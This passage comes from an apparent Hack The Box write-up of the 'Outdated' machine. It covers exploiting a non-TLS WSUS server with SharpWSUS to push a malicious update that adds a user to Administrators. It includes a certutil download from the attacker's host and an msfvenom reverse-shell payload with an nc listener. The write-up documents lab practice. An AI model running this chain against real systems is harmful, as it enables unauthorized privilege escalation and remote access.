+<h2>Exploiting WSUS<a class="headerlink" href="#exploiting-wsus" title="Permalink to this heading">#</a></h2>
+<p>We’ll be using SharpWSUS
+<a class="reference external" href="https://github.com/nettitude/SharpWSUS.git">SharpWSUS</a><br />
+<a class="reference external" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#wsus-deployment">PayloadAllTheThings</a><br />
+Once again I downloaded that on a windows VM with Visual Studio, and attempted to compile it into a dotnet binary. But this approach didn’t work for me cause this is a .NET Framework 4.0 project, and I can’t get that for the version and CPU architecture that I’m running Visual Studio on…
+So I’m extracting that from the
+<a class="reference external" href="https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-SharpWSUS.ps1">S3cur3Th1sSh1t</a> repo.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>wget<span class="w"> </span>https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWSUS.ps1
+<span class="c1"># Deleted everything but the base64 payload from the file then:</span>
+cat<span class="w"> </span>Invoke-SharpWSUS.ps1<span class="w"> </span><span class="p">|</span>base64<span class="w"> </span>-d<span class="w"> </span>&gt;<span class="w"> </span>SharpWSUS.gz
+gunzip<span class="w"> </span>SharpWSUS.gz
+file<span class="w"> </span>SharpWSUS<span class="w">                                        </span>
+SharpWSUS:<span class="w"> </span>PE32<span class="w"> </span>executable<span class="w"> </span><span class="o">(</span>console<span class="o">)</span><span class="w"> </span>Intel<span class="w"> </span><span class="m">80386</span><span class="w"> </span>Mono/.Net<span class="w"> </span>assembly,<span class="w"> </span><span class="k">for</span><span class="w"> </span>MS<span class="w"> </span>Windows
+mv<span class="w"> </span>SharpWSUS<span class="o">{</span>,.exe<span class="o">}</span>
+</pre></div>
+</div>
+<p>upload sharpWSUS on the machine</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>certutil.exe<span class="w"> </span>-urlcache<span class="w"> </span>-f<span class="w"> </span>http://10.10.14.15:8000/SharpWSUS.exe<span class="w"> </span>SharpWSUS.exe
+</pre></div>
+</div>
+<p>make an update that will add sflowers to the administrators group</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">./</span><span class="n">SharpWSUS</span><span class="o">.</span><span class="n">exe</span> <span class="n">create</span> <span class="o">/</span><span class="n">payload</span><span class="p">:</span><span class="s2">&quot;C:\Users\sflowers\Desktop\PsExec64.exe&quot;</span> <span class="o">/</span><span class="n">args</span><span class="p">:</span><span class="s2">&quot;-accepteula -s -d cmd.exe /c </span><span class="se">\&quot;</span><span class="s2">net localgroup administrators sflowers /add</span><span class="se">\&quot;</span><span class="s2">&quot;</span>
+
+ <span class="n">____</span>  <span class="n">_</span>                   <span class="n">__</span>        <span class="n">______</span>  <span class="n">_</span>   <span class="n">_</span> <span class="n">____</span>
+<span class="o">/</span> <span class="n">___</span><span class="o">||</span> <span class="o">|</span><span class="n">__</span>   <span class="n">__</span> <span class="n">_</span> <span class="n">_</span> <span class="n">__</span> <span class="n">_</span> <span class="n">_</span>\ \      <span class="o">/</span> <span class="o">/</span> <span class="n">___</span><span class="o">||</span> <span class="o">|</span> <span class="o">|</span> <span class="o">/</span> <span class="n">___</span><span class="o">|</span>
+\<span class="n">___</span> \<span class="o">|</span> <span class="s1">&#39;_ \ / _` | &#39;</span><span class="n">__</span><span class="o">|</span> <span class="s1">&#39;_ \ \ /\ / /\___ \| | | \___ </span><span class="se">\</span>
+<span class="s1"> ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |</span>
+<span class="o">|</span><span class="n">____</span><span class="o">/|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span>\<span class="n">__</span><span class="p">,</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span>  <span class="o">|</span> <span class="o">.</span><span class="n">__</span><span class="o">/</span> \<span class="n">_</span><span class="o">/</span>\<span class="n">_</span><span class="o">/</span>  <span class="o">|</span><span class="n">____</span><span class="o">/</span> \<span class="n">___</span><span class="o">/|</span><span class="n">____</span><span class="o">/</span>
+                       <span class="o">|</span><span class="n">_</span><span class="o">|</span>
+           <span class="n">Phil</span> <span class="n">Keeble</span> <span class="o">@</span> <span class="n">Nettitude</span> <span class="n">Red</span> <span class="n">Team</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Action</span><span class="p">:</span> <span class="n">Create</span> <span class="n">Update</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Creating</span> <span class="n">patch</span> <span class="n">to</span> <span class="n">use</span> <span class="n">the</span> <span class="n">following</span><span class="p">:</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Payload</span><span class="p">:</span> <span class="n">PsExec64</span><span class="o">.</span><span class="n">exe</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Payload</span> <span class="n">Path</span><span class="p">:</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">sflowers</span>\<span class="n">Desktop</span>\<span class="n">PsExec64</span><span class="o">.</span><span class="n">exe</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Arguments</span><span class="p">:</span> <span class="o">-</span><span class="n">accepteula</span> <span class="o">-</span><span class="n">s</span> <span class="o">-</span><span class="n">d</span> <span class="n">cmd</span><span class="o">.</span><span class="n">exe</span> <span class="o">/</span><span class="n">c</span> \<span class="n">net</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Arguments</span> <span class="p">(</span><span class="n">HTML</span> <span class="n">Encoded</span><span class="p">):</span> <span class="o">-</span><span class="n">accepteula</span> <span class="o">-</span><span class="n">s</span> <span class="o">-</span><span class="n">d</span> <span class="n">cmd</span><span class="o">.</span><span class="n">exe</span> <span class="o">/</span><span class="n">c</span> \<span class="n">net</span>
+
+<span class="c1">################# WSUS Server Enumeration via SQL ##################</span>
+<span class="n">ServerName</span><span class="p">,</span> <span class="n">WSUSPortNumber</span><span class="p">,</span> <span class="n">WSUSContentLocation</span>
+<span class="o">-----------------------------------------------</span>
+<span class="n">DC</span><span class="p">,</span> <span class="mi">8530</span><span class="p">,</span> <span class="n">c</span><span class="p">:</span>\<span class="n">WSUS</span>\<span class="n">WsusContent</span>
+
+<span class="n">ImportUpdate</span>
+<span class="n">Update</span> <span class="n">Revision</span> <span class="n">ID</span><span class="p">:</span> <span class="mi">30</span>
+<span class="n">PrepareXMLtoClient</span>
+<span class="n">InjectURL2Download</span>
+<span class="n">DeploymentRevision</span>
+<span class="n">PrepareBundle</span>
+<span class="n">PrepareBundle</span> <span class="n">Revision</span> <span class="n">ID</span><span class="p">:</span> <span class="mi">31</span>
+<span class="n">PrepareXMLBundletoClient</span>
+<span class="n">DeploymentRevision</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Update</span> <span class="n">created</span> <span class="o">-</span> <span class="n">When</span> <span class="n">ready</span> <span class="n">to</span> <span class="n">deploy</span> <span class="n">use</span> <span class="n">the</span> <span class="n">following</span> <span class="n">command</span><span class="p">:</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">SharpWSUS</span><span class="o">.</span><span class="n">exe</span> <span class="n">approve</span> <span class="o">/</span><span class="n">updateid</span><span class="p">:</span><span class="mi">0141</span><span class="n">ab3f</span><span class="o">-</span><span class="mi">05</span><span class="n">f0</span><span class="o">-</span><span class="mi">4</span><span class="n">d91</span><span class="o">-</span><span class="n">b8d4</span><span class="o">-</span><span class="n">a7d7f4eba208</span> <span class="o">/</span><span class="n">computername</span><span class="p">:</span><span class="n">Target</span><span class="o">.</span><span class="n">FQDN</span> <span class="o">/</span><span class="n">groupname</span><span class="p">:</span><span class="s2">&quot;Group Name&quot;</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">To</span> <span class="n">check</span> <span class="n">on</span> <span class="n">the</span> <span class="n">update</span> <span class="n">status</span> <span class="n">use</span> <span class="n">the</span> <span class="n">following</span> <span class="n">command</span><span class="p">:</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">SharpWSUS</span><span class="o">.</span><span class="n">exe</span> <span class="n">check</span> <span class="o">/</span><span class="n">updateid</span><span class="p">:</span><span class="mi">0141</span><span class="n">ab3f</span><span class="o">-</span><span class="mi">05</span><span class="n">f0</span><span class="o">-</span><span class="mi">4</span><span class="n">d91</span><span class="o">-</span><span class="n">b8d4</span><span class="o">-</span><span class="n">a7d7f4eba208</span> <span class="o">/</span><span class="n">computername</span><span class="p">:</span><span class="n">Target</span><span class="o">.</span><span class="n">FQDN</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">To</span> <span class="n">delete</span> <span class="n">the</span> <span class="n">update</span> <span class="n">use</span> <span class="n">the</span> <span class="n">following</span> <span class="n">command</span><span class="p">:</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">SharpWSUS</span><span class="o">.</span><span class="n">exe</span> <span class="n">delete</span> <span class="o">/</span><span class="n">updateid</span><span class="p">:</span><span class="mi">0141</span><span class="n">ab3f</span><span class="o">-</span><span class="mi">05</span><span class="n">f0</span><span class="o">-</span><span class="mi">4</span><span class="n">d91</span><span class="o">-</span><span class="n">b8d4</span><span class="o">-</span><span class="n">a7d7f4eba208</span> <span class="o">/</span><span class="n">computername</span><span class="p">:</span><span class="n">Target</span><span class="o">.</span><span class="n">FQDN</span> <span class="o">/</span><span class="n">groupname</span><span class="p">:</span><span class="s2">&quot;Group Name&quot;</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Create</span> <span class="n">complete</span>
+</pre></div>
+</div>
+<p>Approve the update</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">./</span><span class="n">SharpWSUS</span><span class="o">.</span><span class="n">exe</span> <span class="n">approve</span> <span class="o">/</span><span class="n">updateid</span><span class="p">:</span><span class="mi">0141</span><span class="n">ab3f</span><span class="o">-</span><span class="mi">05</span><span class="n">f0</span><span class="o">-</span><span class="mi">4</span><span class="n">d91</span><span class="o">-</span><span class="n">b8d4</span><span class="o">-</span><span class="n">a7d7f4eba208</span> <span class="o">/</span><span class="n">computername</span><span class="p">:</span><span class="n">dc</span><span class="o">.</span><span class="n">outdated</span><span class="o">.</span><span class="n">htb</span> <span class="o">/</span><span class="n">groupname</span><span class="p">:</span><span class="s2">&quot;blnkn-admin&quot;</span>
+
+ <span class="n">____</span>  <span class="n">_</span>                   <span class="n">__</span>        <span class="n">______</span>  <span class="n">_</span>   <span class="n">_</span> <span class="n">____</span>
+<span class="o">/</span> <span class="n">___</span><span class="o">||</span> <span class="o">|</span><span class="n">__</span>   <span class="n">__</span> <span class="n">_</span> <span class="n">_</span> <span class="n">__</span> <span class="n">_</span> <span class="n">_</span>\ \      <span class="o">/</span> <span class="o">/</span> <span class="n">___</span><span class="o">||</span> <span class="o">|</span> <span class="o">|</span> <span class="o">/</span> <span class="n">___</span><span class="o">|</span>
+\<span class="n">___</span> \<span class="o">|</span> <span class="s1">&#39;_ \ / _` | &#39;</span><span class="n">__</span><span class="o">|</span> <span class="s1">&#39;_ \ \ /\ / /\___ \| | | \___ </span><span class="se">\</span>
+<span class="s1"> ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |</span>
+<span class="o">|</span><span class="n">____</span><span class="o">/|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span>\<span class="n">__</span><span class="p">,</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span>  <span class="o">|</span> <span class="o">.</span><span class="n">__</span><span class="o">/</span> \<span class="n">_</span><span class="o">/</span>\<span class="n">_</span><span class="o">/</span>  <span class="o">|</span><span class="n">____</span><span class="o">/</span> \<span class="n">___</span><span class="o">/|</span><span class="n">____</span><span class="o">/</span>
+                       <span class="o">|</span><span class="n">_</span><span class="o">|</span>
+           <span class="n">Phil</span> <span class="n">Keeble</span> <span class="o">@</span> <span class="n">Nettitude</span> <span class="n">Red</span> <span class="n">Team</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Action</span><span class="p">:</span> <span class="n">Approve</span> <span class="n">Update</span>
+
+<span class="n">Targeting</span> <span class="n">dc</span><span class="o">.</span><span class="n">outdated</span><span class="o">.</span><span class="n">htb</span>
+<span class="n">TargetComputer</span><span class="p">,</span> <span class="n">ComputerID</span><span class="p">,</span> <span class="n">TargetID</span>
+<span class="o">------------------------------------</span>
+<span class="n">dc</span><span class="o">.</span><span class="n">outdated</span><span class="o">.</span><span class="n">htb</span><span class="p">,</span> <span class="n">bd6d57d0</span><span class="o">-</span><span class="mf">5e6</span><span class="n">f</span><span class="o">-</span><span class="mf">4e74</span><span class="o">-</span><span class="n">a789</span><span class="o">-</span><span class="mi">35</span><span class="n">c8955299e1</span><span class="p">,</span> <span class="mi">1</span>
+<span class="n">Group</span> <span class="n">Exists</span> <span class="o">=</span> <span class="kc">False</span>
+<span class="n">Group</span> <span class="n">Created</span><span class="p">:</span> <span class="n">blnkn</span><span class="o">-</span><span class="n">admin</span>
+<span class="n">Added</span> <span class="n">Computer</span> <span class="n">To</span> <span class="n">Group</span>
+<span class="n">Approved</span> <span class="n">Update</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Approve</span> <span class="n">complete</span>
+</pre></div>
+</div>
+<p>Check if the update has been installed</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">./</span><span class="n">SharpWSUS</span><span class="o">.</span><span class="n">exe</span> <span class="n">check</span> <span class="o">/</span><span class="n">updateid</span><span class="p">:</span><span class="mi">0141</span><span class="n">ab3f</span><span class="o">-</span><span class="mi">05</span><span class="n">f0</span><span class="o">-</span><span class="mi">4</span><span class="n">d91</span><span class="o">-</span><span class="n">b8d4</span><span class="o">-</span><span class="n">a7d7f4eba208</span> <span class="o">/</span><span class="n">computername</span><span class="p">:</span><span class="n">dc</span><span class="o">.</span><span class="n">outdated</span><span class="o">.</span><span class="n">htb</span>
+
+ <span class="n">____</span>  <span class="n">_</span>                   <span class="n">__</span>        <span class="n">______</span>  <span class="n">_</span>   <span class="n">_</span> <span class="n">____</span>
+<span class="o">/</span> <span class="n">___</span><span class="o">||</span> <span class="o">|</span><span class="n">__</span>   <span class="n">__</span> <span class="n">_</span> <span class="n">_</span> <span class="n">__</span> <span class="n">_</span> <span class="n">_</span>\ \      <span class="o">/</span> <span class="o">/</span> <span class="n">___</span><span class="o">||</span> <span class="o">|</span> <span class="o">|</span> <span class="o">/</span> <span class="n">___</span><span class="o">|</span>
+\<span class="n">___</span> \<span class="o">|</span> <span class="s1">&#39;_ \ / _` | &#39;</span><span class="n">__</span><span class="o">|</span> <span class="s1">&#39;_ \ \ /\ / /\___ \| | | \___ </span><span class="se">\</span>
+<span class="s1"> ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |</span>
+<span class="o">|</span><span class="n">____</span><span class="o">/|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span>\<span class="n">__</span><span class="p">,</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span>  <span class="o">|</span> <span class="o">.</span><span class="n">__</span><span class="o">/</span> \<span class="n">_</span><span class="o">/</span>\<span class="n">_</span><span class="o">/</span>  <span class="o">|</span><span class="n">____</span><span class="o">/</span> \<span class="n">___</span><span class="o">/|</span><span class="n">____</span><span class="o">/</span>
+                       <span class="o">|</span><span class="n">_</span><span class="o">|</span>
+           <span class="n">Phil</span> <span class="n">Keeble</span> <span class="o">@</span> <span class="n">Nettitude</span> <span class="n">Red</span> <span class="n">Team</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Action</span><span class="p">:</span> <span class="n">Check</span> <span class="n">Update</span>
+
+<span class="n">Targeting</span> <span class="n">dc</span><span class="o">.</span><span class="n">outdated</span><span class="o">.</span><span class="n">htb</span>
+<span class="n">TargetComputer</span><span class="p">,</span> <span class="n">ComputerID</span><span class="p">,</span> <span class="n">TargetID</span>
+<span class="o">------------------------------------</span>
+<span class="n">dc</span><span class="o">.</span><span class="n">outdated</span><span class="o">.</span><span class="n">htb</span><span class="p">,</span> <span class="n">bd6d57d0</span><span class="o">-</span><span class="mf">5e6</span><span class="n">f</span><span class="o">-</span><span class="mf">4e74</span><span class="o">-</span><span class="n">a789</span><span class="o">-</span><span class="mi">35</span><span class="n">c8955299e1</span><span class="p">,</span> <span class="mi">1</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Update</span> <span class="ow">is</span> <span class="ow">not</span> <span class="n">installed</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Check</span> <span class="n">complete</span>
+</pre></div>
+</div>
+<p>and wait a little until it is, after that, sflowers will be a member of the Administrator group</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">net</span> <span class="n">user</span> <span class="n">sflowers</span>
+<span class="n">User</span> <span class="n">name</span>                    <span class="n">sflowers</span>
+<span class="n">Full</span> <span class="n">Name</span>                    <span class="n">Susan</span> <span class="n">Flowers</span>
+<span class="n">Comment</span>
+<span class="n">User</span><span class="s1">&#39;s comment</span>
+<span class="n">Country</span><span class="o">/</span><span class="n">region</span> <span class="n">code</span>          <span class="mi">000</span> <span class="p">(</span><span class="n">System</span> <span class="n">Default</span><span class="p">)</span>
+<span class="n">Account</span> <span class="n">active</span>               <span class="n">Yes</span>
+<span class="n">Account</span> <span class="n">expires</span>              <span class="n">Never</span>
+
+<span class="n">Password</span> <span class="n">last</span> <span class="nb">set</span>            <span class="mi">6</span><span class="o">/</span><span class="mi">20</span><span class="o">/</span><span class="mi">2022</span> <span class="mi">11</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mi">09</span> <span class="n">AM</span>
+<span class="n">Password</span> <span class="n">expires</span>             <span class="n">Never</span>
+<span class="n">Password</span> <span class="n">changeable</span>          <span class="mi">6</span><span class="o">/</span><span class="mi">21</span><span class="o">/</span><span class="mi">2022</span> <span class="mi">11</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mi">09</span> <span class="n">AM</span>
+<span class="n">Password</span> <span class="n">required</span>            <span class="n">Yes</span>
+<span class="n">User</span> <span class="n">may</span> <span class="n">change</span> <span class="n">password</span>     <span class="n">Yes</span>
+
+<span class="n">Workstations</span> <span class="n">allowed</span>         <span class="n">All</span>
+<span class="n">Logon</span> <span class="n">script</span>
+<span class="n">User</span> <span class="n">profile</span>
+<span class="n">Home</span> <span class="n">directory</span>
+<span class="n">Last</span> <span class="n">logon</span>                   <span class="mi">6</span><span class="o">/</span><span class="mi">15</span><span class="o">/</span><span class="mi">2022</span> <span class="mi">10</span><span class="p">:</span><span class="mi">48</span><span class="p">:</span><span class="mi">27</span> <span class="n">PM</span>
+
+<span class="n">Logon</span> <span class="n">hours</span> <span class="n">allowed</span>          <span class="n">All</span>
+
+<span class="n">Local</span> <span class="n">Group</span> <span class="n">Memberships</span>      <span class="o">*</span><span class="n">Administrators</span>       <span class="o">*</span><span class="n">Remote</span> <span class="n">Management</span> <span class="n">Use</span>
+                             <span class="o">*</span><span class="n">WSUS</span> <span class="n">Administrators</span>
+<span class="n">Global</span> <span class="n">Group</span> <span class="n">memberships</span>     <span class="o">*</span><span class="n">Domain</span> <span class="n">Users</span>
+<span class="n">The</span> <span class="n">command</span> <span class="n">completed</span> <span class="n">successfully</span><span class="o">.</span>
+</pre></div>
+</div>
+<p>you can now log off and log back in and the privilege will be effective, which means that we can navigate to the Admin directory and get the flag</p>
+<p>a few more windows command</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>Get-PSSession<span class="w"> </span>-ComputerName<span class="w"> </span>localhost
+net<span class="w"> </span>users<span class="w"> </span>sflowers
+del<span class="w"> </span>payload.exe
+<span class="nb">cd</span><span class="w"> </span>%temp%<span class="w">          </span><span class="c1"># in CMD</span>
+<span class="nb">cd</span><span class="w"> </span><span class="nv">$Env</span>:temp<span class="w">       </span><span class="c1"># in powershell</span>
+where<span class="w"> </span>certutil.exe<span class="w"> </span><span class="c1"># CMD only? </span>
+</pre></div>
+</div>
+<p>use msfvenom to do a reverse shell in cmd instead of Evil-WinRM’s powershell</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">10</span>.10.14.15<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span><span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>&gt;<span class="w"> </span>payload.exe
+rlwrap<span class="w"> </span>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4444</span>
+</pre></div>
+</div>
+</section>
+</section>
+
+        </article>
+      </div>
+      <footer>
+        
+        <div class="related-pages">
+          <a class="next-page" href="../sandworm/sandworm.html">
+              <div class="page-info">
+                <div class="context">
+                  <span>Next</span>
+                </div>
+                <div class="title">Sandworm</div>
+              </div>
+              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
+            </a>
+          <a class="prev-page" href="../only4you/only4you.html">
+              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
+              <div class="page-info">
+                <div class="context">
+                  <span>Previous</span>
+                </div>
+                
+                <div class="title">Only4you</div>
+                
+              </div>
+            </a>
+        </div>
+        <div class="bottom-of-page">
+          <div class="left-details">
+            <div class="copyright">
+                Copyright &#169; 2023, blnkn
+            </div>
+            Made with <a href="https://www.sphinx-doc.org/">Sphinx</a> and <a class="muted-link" href="https://pradyunsg.me">@pradyunsg</a>'s
+            
+            <a href="https://github.com/pradyunsg/furo">Furo</a>
+            
+          </div>
+          <div class="right-details">
+            
+          </div>
+        </div>
+        
+      </footer>
+    </div>
+    <aside class="toc-drawer">
+      
+      
+      <div class="toc-sticky toc-scroll">
+        <div class="toc-title-container">
+          <span class="toc-title">
+            On this page
+          </span>
+        </div>
+        <div class="toc-tree-container">
+          <div class="toc-tree">
+            <ul>
+<li><a class="reference internal" href="#">Outdated</a><ul>
+<li><a class="reference internal" href="#dns-enum">DNS Enum</a></li>
+<li><a class="reference internal" href="#smtp-enumeration-tangent">SMTP Enumeration Tangent</a></li>
+<li><a class="reference internal" href="#smb-enum">SMB enum</a></li>
+<li><a class="reference internal" href="#cve-2022-30190-follina">CVE-2022-30190 - Follina</a></li>
+<li><a class="reference internal" href="#bloodhound">BloodHound</a></li>
+<li><a class="reference internal" href="#shadow-credential">Shadow Credential</a></li>
+<li><a class="reference internal" href="#discovering-a-non-tls-wsus">Discovering a non TLS WSUS</a></li>
+<li><a class="reference internal" href="#exploiting-wsus">Exploiting WSUS</a></li>
+</ul>
+</li>
+</ul>
+
+          </div>
+        </div>
+      </div>
+      
+      
+    </aside>
+  </div>
+</div><script data-url_root="../../../../" id="documentation_options" src="../../../../_static/documentation_options.js?v=b3ba4146"></script>
+    <script src="../../../../_static/doctools.js?v=888ff710"></script>
+    <script src="../../../../_static/sphinx_highlight.js?v=4825356b"></script>
+    <script src="../../../../_static/scripts/furo.js?v=32e29ea5"></script>
+    </body>
+</html>
